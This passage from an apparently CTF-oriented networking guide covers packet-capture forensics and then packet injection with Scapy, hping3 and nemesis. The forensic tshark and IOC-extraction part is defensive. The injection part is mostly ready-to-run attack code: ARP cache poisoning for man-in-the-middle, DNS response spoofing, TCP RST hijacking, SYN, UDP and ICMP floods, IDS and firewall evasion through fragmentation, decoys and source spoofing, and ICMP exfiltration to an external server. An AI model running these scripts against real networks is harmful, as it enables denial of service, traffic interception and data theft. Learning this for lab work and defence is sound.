  -T fields -e frame.time -e ip.src -e ip.dst \
  -e _ws.col.Protocol -e _ws.col.Info | \
  sort | uniq > critical_events.txt
```

**Session timeline:**

```python
#!/usr/bin/env python3
from scapy.all import *
from collections import defaultdict
import json

packets = rdpcap('evidence.pcap')
sessions = defaultdict(lambda: {'start': None, 'end': None, 'packets': 0, 'bytes': 0})

for pkt in packets:
    if IP in pkt and TCP in pkt:
        session_key = f"{pkt[IP].src}:{pkt[TCP].sport}->{pkt[IP].dst}:{pkt[TCP].dport}"
        
        if sessions[session_key]['start'] is None:
            sessions[session_key]['start'] = pkt.time
        
        sessions[session_key]['end'] = pkt.time
        sessions[session_key]['packets'] += 1
        sessions[session_key]['bytes'] += len(pkt)

# Sort by start time
timeline = []
for session, data in sessions.items():
    if data['start']:
        timeline.append({
            'session': session,
            'start': data['start'],
            'duration': data['end'] - data['start'] if data['end'] else 0,
            'packets': data['packets'],
            'bytes': data['bytes']
        })

timeline.sort(key=lambda x: x['start'])

# Output timeline
for event in timeline:
    print(f"[{event['start']:.2f}] {event['session']}")
    print(f"  Duration: {event['duration']:.2f}s, Packets: {event['packets']}, Bytes: {event['bytes']}")
```

### Indicator of Compromise (IOC) Extraction

**IP addresses:**

```bash
# Extract all unique IPs
tshark -r evidence.pcap -T fields -e ip.src -e ip.dst | \
  tr '\t' '\n' | sort -u | grep -v "^$" > ioc_ips.txt

# Identify external IPs (exclude RFC1918)
cat ioc_ips.txt | \
  grep -vE "^10\.|^172\.(1[6-9]|2[0-9]|3[0-1])\.|^192\.168\." > external_ips.txt

# Check against threat intelligence (example with AbuseIPDB API)
while read ip; do
  curl -s -G https://api.abuseipdb.com/api/v2/check \
    --data-urlencode "ipAddress=$ip" \
    -H "Key: YOUR_API_KEY" \
    -H "Accept: application/json" | \
    jq -r ".data | select(.abuseConfidenceScore > 50) | .ipAddress, .abuseConfidenceScore"
done < external_ips.txt
```

**Domain names:**

```bash
# Extract all queried domains
tshark -r evidence.pcap -Y "dns.qry.name" -T fields \
  -e dns.qry.name | sort -u > ioc_domains.txt

# Extract domains from HTTP Host headers
tshark -r evidence.pcap -Y "http.host" -T fields \
  -e http.host | sort -u >> ioc_domains.txt

# Extract SNI from TLS
tshark -r evidence.pcap -Y "ssl.handshake.extensions_server_name" \
  -T fields -e ssl.handshake.extensions_server_name | \
  sort -u >> ioc_domains.txt

# Deduplicate
sort -u ioc_domains.txt -o ioc_domains.txt

# Check against malicious domain lists
grep -f ioc_domains.txt /path/to/malicious_domains.txt
```

**URLs:**

```bash
# Extract all HTTP URLs
tshark -r evidence.pcap -Y "http.request" -T fields \
  -e http.host -e http.request.uri | \
  awk '{print "http://"$1$2}' > ioc_urls.txt

# Extract HTTPS URLs (from SNI + requests if decrypted)
tshark -r evidence.pcap -Y "ssl.handshake.extensions_server_name" \
  -T fields -e ssl.handshake.extensions_server_name | \
  awk '{print "https://"$1}' >> ioc_urls.txt

# Identify suspicious URL patterns
grep -iE "\.php\?|\.asp\?|cmd=|exec=|eval\(|base64" ioc_urls.txt
```

**File hashes:**

```bash
# Calculate hashes for extracted objects
find ./extracted_objects -type f -exec sha256sum {} \; > ioc_hashes.txt

# Check against VirusTotal
while read hash filename; do
  echo "Checking $filename ($hash)"
  curl -s --request GET \
    --url "https://www.virustotal.com/api/v3/files/$hash" \
    --header "x-apikey: YOUR_API_KEY" | \
    jq -r '.data.attributes.last_analysis_stats'
  sleep 15  # Rate limiting
done < ioc_hashes.txt
```

### User Attribution and Behavior Analysis

**Identify user activities:**

```bash
# HTTP authentication credentials (cleartext)
tshark -r evidence.pcap -Y "http.authorization" \
  -T fields -e frame.time -e ip.src -e http.authorization

# FTP credentials
tshark -r evidence.pcap -Y "ftp.request.command == USER or ftp.request.command == PASS" \
  -T fields -e frame.time -e ip.src -e ftp.request.command -e ftp.request.arg

# SMTP from addresses
tshark -r evidence.pcap -Y "smtp.req.command == MAIL" \
  -T fields -e frame.time -e ip.src -e smtp.req.parameter

# Web browsing history
tshark -r evidence.pcap -Y "http.request.method == GET" \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri | \
  sort
```

**User device fingerprinting:**

```bash
# Operating system identification via TTL
tshark -r evidence.pcap -Y "ip" -T fields -e ip.src -e ip.ttl | \
  sort -u | \
  awk '{
    if ($2 <= 64) os="Linux/Unix"
    else if ($2 <= 128) os="Windows"
    else os="Cisco/Network Device"
    print $1, "TTL="$2, os
  }'

# Browser fingerprinting
tshark -r evidence.pcap -Y "http.user_agent" \
  -T fields -e ip.src -e http.user_agent | \
  sort -u

# DHCP hostname identification
tshark -r evidence.pcap -Y "bootp.option.hostname" \
  -T fields -e bootp.ip.your -e bootp.option.hostname
```

### Lateral Movement Detection

**Internal reconnaissance:**

```bash
# ARP requests (network mapping)
tshark -r evidence.pcap -Y "arp.opcode == 1" \
  -T fields -e frame.time -e arp.src.hw_mac -e arp.dst.proto_ipv4 | \
  awk '{count[$2]++} END {for(mac in count) print mac, count[mac]}' | \
  sort -k2 -rn

# SMB enumeration attempts
tshark -r evidence.pcap -Y "smb or smb2" \
  -T fields -e frame.time -e ip.src -e ip.dst -e smb.cmd -e smb2.cmd

# RDP connection attempts
tshark -r evidence.pcap -Y "tcp.port == 3389" \
  -T fields -e frame.time -e ip.src -e ip.dst -e tcp.flags

# SSH brute force detection
tshark -r evidence.pcap -Y "tcp.port == 22" \
  -T fields -e frame.time -e ip.src -e ip.dst | \
  awk '{count[$2"->"$3]++} END {for(conn in count) if(count[conn]>10) print conn, count[conn]}'
```

**Credential theft indicators:**

```bash
# NTLM authentication traffic
tshark -r evidence.pcap -Y "ntlmssp" \
  -T fields -e frame.time -e ip.src -e ip.dst -e ntlmssp.auth.username

# Kerberos ticket requests
tshark -r evidence.pcap -Y "kerberos" \
  -T fields -e frame.time -e ip.src -e kerberos.CNameString

# LDAP queries (credential dumping)
tshark -r evidence.pcap -Y "ldap" \
  -T fields -e frame.time -e ip.src -e ldap.filter
```

### Persistence Mechanism Identification

**Scheduled task creation (Windows RPC):**

```bash
# DCERPC traffic analysis
tshark -r evidence.pcap -Y "dcerpc" \
  -T fields -e frame.time -e ip.src -e ip.dst -e dcerpc.cn_call_id

# Suspicious service creation
tshark -r evidence.pcap -Y "smb2.cmd == 5" \
  -T fields -e frame.time -e ip.src -e smb2.filename | \
  grep -iE "\.exe|\.dll|\.sys"
```

**Registry modification detection:**

[Inference] Direct registry modification detection in network traffic is limited without endpoint logging, though file transfers of registry hive backups or remote registry access via SMB may be observable.

```bash
# Remote registry access
tshark -r evidence.pcap -Y "smb2" -T fields \
  -e smb2.filename | grep -i "system32\\\\config"
```

### Log Correlation

**Correlating multiple data sources:**

```bash
# Generate PCAP event log
tshark -r evidence.pcap -T fields \
  -e frame.time_epoch -e ip.src -e ip.dst -e _ws.col.Protocol \
  > pcap_events.log

# Example: Correlate with firewall logs
# Format: timestamp,src_ip,dst_ip,action
join -t',' -1 2 -2 2 \
  <(sort -t',' -k2 pcap_events.log) \
  <(sort -t',' -k2 firewall.log) | \
  awk -F',' '$5 == "DENY"' > blocked_attempts.log
```

### Forensic Reporting

**Evidence documentation structure:**

```bash
#!/bin/bash
# Generate forensic report

CASE_ID="INC-2025-1020"
EVIDENCE_FILE="evidence.pcap"
OUTPUT_DIR="forensic_report_$CASE_ID"

mkdir -p "$OUTPUT_DIR"/{iocs,timelines,artifacts,screenshots}

# Executive summary data
echo "=== Forensic Analysis Report ===" > "$OUTPUT_DIR/report.txt"
echo "Case ID: $CASE_ID" >> "$OUTPUT_DIR/report.txt"
echo "Analyst: $(whoami)" >> "$OUTPUT_DIR/report.txt"
echo "Analysis Date: $(date)" >> "$OUTPUT_DIR/report.txt"
echo "Evidence File: $EVIDENCE_FILE" >> "$OUTPUT_DIR/report.txt"
echo "" >> "$OUTPUT_DIR/report.txt"

# File integrity
echo "=== Evidence Integrity ===" >> "$OUTPUT_DIR/report.txt"
sha256sum "$EVIDENCE_FILE" >> "$OUTPUT_DIR/report.txt"
capinfos "$EVIDENCE_FILE" >> "$OUTPUT_DIR/report.txt"
echo "" >> "$OUTPUT_DIR/report.txt"

# Network statistics
echo "=== Network Statistics ===" >> "$OUTPUT_DIR/report.txt"
tshark -r "$EVIDENCE_FILE" -q -z io,phs >> "$OUTPUT_DIR/report.txt"
echo "" >> "$OUTPUT_DIR/report.txt"

# Top talkers
echo "=== Top Communicating Hosts ===" >> "$OUTPUT_DIR/report.txt"
tshark -r "$EVIDENCE_FILE" -q -z conv,tcp | head -20 >> "$OUTPUT_DIR/report.txt"
echo "" >> "$OUTPUT_DIR/report.txt"

# IOCs
echo "Extracting IOCs..."
tshark -r "$EVIDENCE_FILE" -T fields -e ip.src -e ip.dst | \
  tr '\t' '\n' | sort -u > "$OUTPUT_DIR/iocs/ip_addresses.txt"
tshark -r "$EVIDENCE_FILE" -Y "dns.qry.name" -T fields -e dns.qry.name | \
  sort -u > "$OUTPUT_DIR/iocs/domains.txt"
tshark -r "$EVIDENCE_FILE" -Y "http.request" -T fields \
  -e http.host -e http.request.uri | \
  awk '{print "http://"$1$2}' > "$OUTPUT_DIR/iocs/urls.txt"

# Timeline
echo "Generating timeline..."
tshark -r "$EVIDENCE_FILE" -T fields \
  -e frame.time -e ip.src -e ip.dst -e _ws.col.Info \
  > "$OUTPUT_DIR/timelines/full_timeline.txt"

# Package report
tar -czf "$OUTPUT_DIR.tar.gz" "$OUTPUT_DIR"
echo "Report generated: $OUTPUT_DIR.tar.gz"
```

**Chain of custody documentation:**

```bash
# Chain of custody log template
cat > chain_of_custody.txt << EOF
CHAIN OF CUSTODY LOG

Case Number: INC-2025-1020
Evidence Item: evidence.pcap
Description: Network packet capture from incident investigation

Date/Time Collected: 2025-10-20 14:30:00 UTC
Collected By: John Analyst
Collection Method: tcpdump on eth0

SHA256 Hash: $(sha256sum evidence.pcap | awk '{print $1}')

Transfer Log:
--------------
[2025-10-20 14:35] Transferred to forensic workstation by John Analyst
[2025-10-20 15:00] Analysis begun by John Analyst
[$(date)] Analysis completed

Notes:
- Evidence stored on encrypted filesystem
- Analysis performed on isolated network
- No modifications made to original file
EOF
```

---

## Packet Injection Problems

Packet injection challenges require crafting and transmitting custom network packets to exploit vulnerabilities, bypass filters, manipulate protocols, or achieve specific network behaviors. These scenarios test understanding of protocol specifications, packet structure, and network stack manipulation.

### Packet Crafting Fundamentals

**Scapy basics:**

```python
#!/usr/bin/env python3
from scapy.all import *

# Basic packet construction
packet = IP(dst="192.168.1.100")/TCP(dport=80)
send(packet)

# Layer-by-layer construction
eth = Ether(dst="ff:ff:ff:ff:ff:ff")
ip = IP(src="192.168.1.50", dst="192.168.1.100")
tcp = TCP(sport=12345, dport=80, flags="S")
packet = eth/ip/tcp
sendp(packet, iface="eth0")

# UDP packet with payload
packet = IP(dst="192.168.1.100")/UDP(dport=53)/Raw(load=b"\x00\x01\x00\x00")
send(packet)

# ICMP echo request
packet = IP(dst="8.8.8.8")/ICMP(type=8, code=0)/Raw(load=b"flag{hidden_data}")
send(packet)
```

**Scapy advanced features:**

```python
# Fuzzing specific fields
send(IP(dst="192.168.1.100")/fuzz(TCP(dport=80)))

# Layer manipulation
packet = IP()/TCP()
packet[IP].dst = "192.168.1.100"
packet[TCP].dport = 443
packet[TCP].flags = "PA"
packet.show()  # Display packet structure
send(packet)

# Multiple packets with variations
for port in range(80, 85):
    packet = IP(dst="192.168.1.100")/TCP(dport=port, flags="S")
    send(packet, verbose=0)

# Packet with specific TTL
packet = IP(dst="192.168.1.100", ttl=1)/ICMP()
send(packet)
```

### TCP Manipulation

**TCP handshake crafting:**

```python
# Manual SYN
syn = IP(dst="192.168.1.100")/TCP(dport=80, flags="S", seq=1000)
syn_ack = sr1(syn)

# Complete handshake
ack = IP(dst="192.168.1.100")/TCP(dport=80, flags="A", 
                                   seq=syn_ack.ack, ack=syn_ack.seq+1)
send(ack)

# Send data
data = IP(dst="192.168.1.100")/TCP(dport=80, flags="PA",
                                    seq=syn_ack.ack, ack=syn_ack.seq+1)/\
       Raw(load=b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
response = sr1(data)

# Close connection
fin = IP(dst="192.168.1.100")/TCP(dport=80, flags="FA",
                                   seq=response.ack, ack=response.seq+len(response[Raw]))
send(fin)
```

**TCP flag manipulation:**

```python
# Christmas tree packet (all flags set)
packet = IP(dst="192.168.1.100")/TCP(dport=80, flags="UAPRSF")
send(packet)

# NULL scan (no flags)
packet = IP(dst="192.168.1.100")/TCP(dport=80, flags="")
send(packet)

# FIN scan
packet = IP(dst="192.168.1.100")/TCP(dport=80, flags="F")
send(packet)

# Xmas scan
packet = IP(dst="192.168.1.100")/TCP(dport=80, flags="FPU")
send(packet)

# Custom flag combinations for firewall evasion
packet = IP(dst="192.168.1.100")/TCP(dport=80, flags="SA")  # SYN+ACK without handshake
send(packet)
```

**TCP options manipulation:**

```python
# MSS option
packet = IP()/TCP(dport=80, options=[('MSS', 1460)])
send(packet)

# Window scale
packet = IP()/TCP(dport=80, options=[('WScale', 7)])
send(packet)

# Timestamp
packet = IP()/TCP(dport=80, options=[('Timestamp', (123456, 0))])
send(packet)

# Multiple options
packet = IP()/TCP(dport=80, options=[
    ('MSS', 1460),
    ('SAckOK', b''),
    ('Timestamp', (123456, 0)),
    ('NOP', None),
    ('WScale', 7)
])
send(packet)

# Custom/malformed options for IDS evasion
packet = IP()/TCP(dport=80, options=[(254, b'\x00\x01\x02\x03')])  # Unknown option
send(packet)
```

### IP Layer Manipulation

**IP fragmentation:**

```python
# Manual fragmentation
payload = b"A" * 2000
packet = IP(dst="192.168.1.100")/ICMP()/Raw(load=payload)
frags = fragment(packet, fragsize=800)
for frag in frags:
    send(frag)

# Overlapping fragments (evasion technique)
frag1 = IP(dst="192.168.1.100", flags="MF", frag=0)/Raw(load=b"AAAA")
frag2 = IP(dst="192.168.1.100", flags=0, frag=1)/Raw(load=b"BBBB")
send(frag1)
send(frag2)

# Out-of-order fragments
frags = fragment(IP(dst="192.168.1.100")/ICMP()/Raw(load=b"X"*3000))
send(frags[2])
send(frags[0])
send(frags[1])
```

**IP options and spoofing:**

```python
# Source IP spoofing
packet = IP(src="10.0.0.1", dst="192.168.1.100")/TCP(dport=80, flags="S")
send(packet)

# Record route option
packet = IP(dst="8.8.8.8", options=[IPOption_RR()])/ICMP()
response = sr1(packet)
response[IP].options

# Loose source routing
packet = IP(dst="192.168.1.100", options=[IPOption_LSRR(routers=["10.0.0.1", "10.0.0.2"])])/ICMP()
send(packet)

# Custom TTL for traceroute-like behavior
for ttl in range(1, 30):
    packet = IP(dst="8.8.8.8", ttl=ttl)/ICMP()
    reply = sr1(packet, timeout=2, verbose=0)
    if reply:
        print(f"TTL {ttl}: {reply.src}")
        if reply.src == "8.8.8.8":
            break
```

### DNS Packet Injection

**DNS query crafting:**

```python
# Basic DNS query
dns_query = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_query)

# Specific record types
dns_query = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com", qtype="MX"))
response = sr1(dns_query)

# Multiple questions
dns_query = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=[
    DNSQR(qname="example.com", qtype="A"),
    DNSQR(qname="example.com", qtype="AAAA")
])
send(dns_query)

# DNS tunneling payload
subdomain = "".join(f"{ord(c):02x}" for c in "secret_data")
dns_query = IP(dst="192.168.1.53")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f"{subdomain}.tunnel.example.com"))
send(dns_query)
```

**DNS response injection (spoofing):**

```python
# DNS cache poisoning attempt
def dns_spoof(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # Query
        spoofed_response = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=300, rdata="192.168.1.66"))
        send(spoofed_response, verbose=0)
        print(f"Spoofed response for {pkt[DNS].qd.qname}")

sniff(filter="udp port 53", prn=dns_spoof, iface="eth0")
```

### ARP Spoofing and Poisoning

```python
# ARP reply (unsolicited)
arp_reply = ARP(op=2, pdst="192.168.1.100", hwdst="aa:bb:cc:dd:ee:ff",
                psrc="192.168.1.1", hwsrc="11:22:33:44:55:66")
send(arp_reply)

# ARP cache poisoning (MITM setup)
target_ip = "192.168.1.100"
gateway_ip = "192.168.1.1"
attacker_mac = "11:22:33:44:55:66"

# Poison target (make target think we're the gateway)
arp_target = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip),
                 psrc=gateway_ip, hwsrc=attacker_mac)

# Poison gateway (make gateway think we're the target)
arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=getmacbyip(gateway_ip),
                  psrc=target_ip, hwsrc=attacker_mac)

# Continuous poisoning
while True:
    send(arp_target, verbose=0)
    send(arp_gateway, verbose=0)
    time.sleep(2)
```

### ICMP Manipulation

```python
# ICMP redirect
icmp_redirect = IP(src="192.168.1.1", dst="192.168.1.100")/\
                ICMP(type=5, code=1, gw="192.168.1.50")/\
                IP(src="192.168.1.100", dst="8.8.8.8")/TCP()
send(icmp_redirect)

# ICMP destination unreachable (port unreachable)
icmp_unreach = IP(src="192.168.1.100", dst="192.168.1.50")/\
               ICMP(type=3, code=3)/\
               IP(src="192.168.1.50", dst="192.168.1.100")/UDP(dport=12345)
send(icmp_unreach)

# Oversized ICMP (Ping of Death)
packet = IP(dst="192.168.1.100")/ICMP()/Raw(load="X"*70000)
send(fragment(packet))

# ICMP with custom payload
packet = IP(dst="192.168.1.100")/ICMP()/Raw(load=b"flag{icmp_covert_channel}")
send(packet)
```

### Application Layer Injection

**HTTP injection:**

```python
# HTTP GET request
http_get = IP(dst="192.168.1.100")/TCP(dport=80, flags="PA")/\
           Raw(load=b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n")
send(http_get)

# HTTP POST with data
post_data = b"username=admin&password=password123"
http_post = IP(dst="192.168.1.100")/TCP(dport=80, flags="PA")/\
            Raw(load=b"POST /login HTTP/1.1\r\n" +
                     b"Host: example.com\r\n" +
                     b"Content-Type: application/x-www-form-urlencoded\r\n" +
                     b"Content-Length: " + str(len(post_data)).encode() + b"\r\n\r\n" +
                     post_data)
send(http_post)

# HTTP header injection
malicious_header = b"GET / HTTP/1.1\r\nHost: example.com\r\nX-Flag: flag{header_injection}\r\n\r\n"
http_inject = IP(dst="192.168.1.100")/TCP(dport=80, flags="PA")/Raw(load=malicious_header)
send(http_inject)
```

**SMTP injection:**

```python
# SMTP session
smtp_helo = IP(dst="192.168.1.25")/TCP(dport=25, flags="PA")/Raw(load=b"HELO attacker.com\r\n")
send(smtp_helo)

smtp_mail = IP(dst="192.168.1.25")/TCP(dport=25, flags="PA")/Raw(load=b"MAIL FROM:<attacker@evil.com>\r\n")
send(smtp_mail)

smtp_rcpt = IP(dst="192.168.1.25")/TCP(dport=25, flags="PA")/Raw(load=b"RCPT TO:<victim@target.com>\r\n")
send(smtp_rcpt)

smtp_data = IP(dst="192.168.1.25")/TCP(dport=25, flags="PA")/Raw(load=b"DATA\r\n")
send(smtp_data)

smtp_msg = IP(dst="192.168.1.25")/TCP(dport=25, flags="PA")/\
           Raw(load=b"Subject: Test\r\n\r\nFlag: flag{smtp_injection}\r\n.\r\n")
send(smtp_msg)
```

### Evasion Techniques

**Fragmentation evasion:**

```python
# Fragment HTTP request across multiple packets
http_request = b"GET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n"
for i in range(0, len(http_request), 8):
    chunk = http_request[i:i+8]
    packet = IP(dst="192.168.1.100")/TCP(dport=80, flags="PA")/Raw(load=chunk)
    send(packet)
    time.sleep(0.1)
```

**Timing-based evasion:**

```python
import time
import random
from scapy.all import IP, TCP, send

# Define the list of ports to scan
ports = [21, 22, 23, 25, 80, 443, 3389, 8080]

# Slow scan to evade rate-based detection
for port in ports:
    # Create an IP/TCP packet with the SYN flag
    packet = IP(dst="192.168.1.100") / TCP(dport=port, flags="S")
    
    # Send the packet without verbose output
    send(packet, verbose=0)
    
    # Implement a random delay between 30 and 120 seconds
    time.sleep(random.uniform(30, 120))
````

**Packet padding and obfuscation:**

```python
# Add padding to evade signature detection
payload = b"malicious_payload"
padding = b"\x00" * random.randint(100, 500)
packet = IP(dst="192.168.1.100")/TCP(dport=80, flags="PA")/Raw(load=payload + padding)
send(packet)

# Insert garbage data between fragments
legitimate_data = b"GET / HTTP/1.1\r\n"
garbage_frag = IP(dst="192.168.1.100", flags="MF", frag=0)/Raw(load=b"GARBAGE")
real_frag = IP(dst="192.168.1.100", frag=2)/Raw(load=legitimate_data)
send(garbage_frag)
time.sleep(0.5)
send(real_frag)
````

**Decoy scanning:**

```python
# Use decoy IPs to mask real source
decoys = ["10.0.0.5", "10.0.0.6", "10.0.0.7"]
real_src = "10.0.0.10"
target = "192.168.1.100"

for src_ip in decoys + [real_src]:
    packet = IP(src=src_ip, dst=target)/TCP(dport=80, flags="S")
    send(packet, verbose=0)
```

### Protocol-Specific Exploits

**TCP sequence prediction:**

```python
# Attempt to predict TCP sequence numbers
def predict_sequence(target_ip, target_port):
    sequences = []
    
    for i in range(10):
        syn = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
        syn_ack = sr1(syn, timeout=2, verbose=0)
        if syn_ack and syn_ack.haslayer(TCP):
            sequences.append(syn_ack[TCP].seq)
            # Send RST to close connection
            rst = IP(dst=target_ip)/TCP(dport=target_port, flags="R", 
                                         seq=syn_ack.ack, ack=syn_ack.seq+1)
            send(rst, verbose=0)
        time.sleep(1)
    
    if len(sequences) > 1:
        diffs = [sequences[i+1] - sequences[i] for i in range(len(sequences)-1)]
        avg_diff = sum(diffs) / len(diffs)
        predicted = sequences[-1] + int(avg_diff)
        print(f"Predicted next sequence: {predicted}")
        return predicted
    return None

predict_sequence("192.168.1.100", 80)
```

**TCP RST injection (connection hijacking):**

```python
# Inject RST to terminate connection
def inject_rst(src_ip, dst_ip, src_port, dst_port, seq_num):
    rst_packet = IP(src=src_ip, dst=dst_ip)/\
                 TCP(sport=src_port, dport=dst_port, flags="R", seq=seq_num)
    send(rst_packet)
    print(f"RST injected: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")

# Sniff to get valid sequence numbers
def hijack_connection(target_filter):
    def process_packet(pkt):
        if pkt.haslayer(TCP) and pkt[TCP].flags & 0x10:  # ACK flag
            inject_rst(pkt[IP].src, pkt[IP].dst, 
                      pkt[TCP].sport, pkt[TCP].dport,
                      pkt[TCP].seq)
    
    sniff(filter=target_filter, prn=process_packet, count=1)

# Example: hijack HTTP connection
hijack_connection("tcp port 80 and host 192.168.1.100")
```

**SYN flood attack:**

```python
# SYN flood with random source IPs
def syn_flood(target_ip, target_port, count=1000):
    for i in range(count):
        src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        packet = IP(src=src_ip, dst=target_ip)/\
                 TCP(sport=src_port, dport=target_port, flags="S")
        send(packet, verbose=0)
        if i % 100 == 0:
            print(f"Sent {i} SYN packets")

# Use with caution in authorized testing only
# syn_flood("192.168.1.100", 80, 1000)
```

### Challenge-Specific Scenarios

**Bypass MAC filtering:**

```python
# Spoof allowed MAC address
allowed_mac = "aa:bb:cc:dd:ee:ff"
packet = Ether(src=allowed_mac)/IP(dst="192.168.1.1")/ICMP()
sendp(packet, iface="eth0")
```

**Bypass firewall rules:**

```python
# Source port manipulation (some firewalls allow source port 53 for DNS)
packet = IP(dst="192.168.1.100")/TCP(sport=53, dport=22, flags="S")
send(packet)

# Fragment to evade deep packet inspection
data = IP(dst="192.168.1.100")/TCP(dport=80)/Raw(load=b"GET /admin HTTP/1.1\r\n\r\n")
frags = fragment(data, fragsize=8)
for frag in frags:
    send(frag)
```

**Trigger specific IDS signatures:**

```python
# Craft packet to trigger Snort/Suricata rule
# Example: Trigger "SQL injection" signature
http_sqli = IP(dst="192.168.1.100")/TCP(dport=80, flags="PA")/\
            Raw(load=b"GET /?id=1' UNION SELECT * FROM users-- HTTP/1.1\r\nHost: test.com\r\n\r\n")
send(http_sqli)

# Trigger "Nmap scan" signature
for flag_combo in ["S", "F", "FPU", ""]:
    packet = IP(dst="192.168.1.100")/TCP(dport=80, flags=flag_combo)
    send(packet, verbose=0)
    time.sleep(0.1)
```

**Exploit time-based vulnerabilities:**

```python
# Race condition exploitation via simultaneous requests
def race_condition_exploit(target_ip, target_port, payload):
    threads = []
    
    def send_request():
        packet = IP(dst=target_ip)/TCP(dport=target_port, flags="PA")/Raw(load=payload)
        send(packet, verbose=0)
    
    for _ in range(10):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
    
    for thread in threads:
        thread.start()
    
    for thread in threads:
        thread.join()

# Example usage
payload = b"POST /transfer HTTP/1.1\r\nHost: bank.com\r\nContent-Length: 50\r\n\r\namount=1000&to=attacker"
race_condition_exploit("192.168.1.100", 80, payload)
```

### Advanced Scapy Techniques

**Custom protocol layers:**

```python
from scapy.all import *

# Define custom protocol
class CustomProto(Packet):
    name = "CustomProto"
    fields_desc = [
        ByteField("version", 1),
        ByteField("type", 0),
        ShortField("length", None),
        StrLenField("data", "", length_from=lambda pkt: pkt.length)
    ]
    
    def post_build(self, pkt, pay):
        if self.length is None and pay:
            pkt = pkt[:2] + struct.pack("!H", len(pay)) + pkt[4:]
        return pkt + pay

# Use custom protocol
packet = IP(dst="192.168.1.100")/UDP(dport=9999)/CustomProto(type=5, data=b"flag{custom_protocol}")
send(packet)
```

**Packet sniffing and injection:**

```python
# Inject response to sniffed packets
def inject_response(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].dport == 80:
        if pkt.haslayer(Raw) and b"GET" in pkt[Raw].load:
            # Craft HTTP response
            response = IP(src=pkt[IP].dst, dst=pkt[IP].src)/\
                      TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport,
                          flags="PA", seq=pkt[TCP].ack, ack=pkt[TCP].seq+len(pkt[Raw]))/\
                      Raw(load=b"HTTP/1.1 200 OK\r\nContent-Length: 13\r\n\r\nflag{injected}")
            send(response, verbose=0)
            print(f"Injected response to {pkt[IP].src}")

sniff(filter="tcp port 80", prn=inject_response, iface="eth0")
```

**Replay attacks:**

```python
# Capture and replay packets
captured_packets = []

def capture_packet(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].dport == 80:
        captured_packets.append(pkt)
        if len(captured_packets) >= 10:
            return True  # Stop sniffing

sniff(filter="tcp port 80", prn=capture_packet, stop_filter=lambda x: len(captured_packets) >= 10)

# Replay captured packets
print(f"Replaying {len(captured_packets)} packets")
for pkt in captured_packets:
    # Modify destination if needed
    pkt[IP].dst = "192.168.1.200"
    del pkt[IP].chksum
    del pkt[TCP].chksum
    send(pkt, verbose=0)
    time.sleep(0.1)
```

### Hping3 for Quick Injection

```bash
# TCP SYN flood
hping3 -S -p 80 --flood 192.168.1.100

# UDP flood
hping3 --udp -p 53 --flood 192.168.1.100

# ICMP flood
hping3 -1 --flood 192.168.1.100

# Custom TCP flags
hping3 -F -P -U -p 80 192.168.1.100  # FIN, PUSH, URG

# Specific sequence number
hping3 -S -p 80 -M 1000 -L 2000 192.168.1.100  # seq=1000, ack=2000

# Fragment packets
hping3 -S -p 80 -f 192.168.1.100

# Spoof source IP
hping3 -S -p 80 -a 10.0.0.1 192.168.1.100

# TCP with data
hping3 -S -p 80 -d 100 192.168.1.100  # 100 bytes of data

# Traceroute-like
hping3 -T -p 80 --traceroute 192.168.1.100
```

### Nemesis for Protocol Testing

```bash
# Craft ICMP packet
nemesis icmp -i 8 -c 0 -D 192.168.1.100 -P icmp_payload.txt

# TCP with custom flags
nemesis tcp -fS -fA -x 12345 -y 80 -D 192.168.1.100

# UDP packet
nemesis udp -x 12345 -y 53 -P dns_payload.bin -D 192.168.1.100

# ARP packet
nemesis arp -r -d ff:ff:ff:ff:ff:ff -H aa:bb:cc:dd:ee:ff \
  -S 192.168.1.50 -D 192.168.1.100

# IP with custom options
nemesis ip -P 1 -D 192.168.1.100 -O ip_options.bin
```

### Packet Injection Challenges Solutions

**Scenario: Bypass port knocking sequence:**

```python
#!/usr/bin/env python3
from scapy.all import *
import time

target = "192.168.1.100"
knock_sequence = [1234, 5678, 9012]

for port in knock_sequence:
    packet = IP(dst=target)/TCP(dport=port, flags="S")
    send(packet, verbose=0)
    print(f"Knocked port {port}")
    time.sleep(0.5)

# After sequence, access protected service
access_packet = IP(dst=target)/TCP(dport=22, flags="S")
syn_ack = sr1(access_packet, timeout=2)
if syn_ack:
    print("Port 22 opened after knock sequence!")
```

**Scenario: Exploit trust relationship:**

```python
# Spoof trusted internal IP
trusted_ip = "192.168.1.10"
target = "192.168.1.100"

packet = IP(src=trusted_ip, dst=target)/TCP(dport=445, flags="S")
response = sr1(packet, timeout=2)
if response:
    print(f"Received response from {target} when spoofing {trusted_ip}")
```

**Scenario: Covert channel exfiltration:**

```python
# Exfiltrate data via ICMP payload
data = b"flag{exfiltrated_secret_data}"
destination = "8.8.8.8"  # External server

# Split data across multiple ICMP packets
chunk_size = 8
for i in range(0, len(data), chunk_size):
    chunk = data[i:i+chunk_size]
    packet = IP(dst=destination)/ICMP(id=i//chunk_size)/Raw(load=chunk)
    send(packet, verbose=0)
    print(f"Sent chunk {i//chunk_size}: {chunk}")
    time.sleep(1)
```

**Scenario: DNS cache poisoning:**

```python
# Wait for DNS query and inject fake response
def poison_dns(pkt):
    if DNS in pkt and pkt[DNS].qr == 0:
        qname = pkt[DNS].qd.qname.decode()
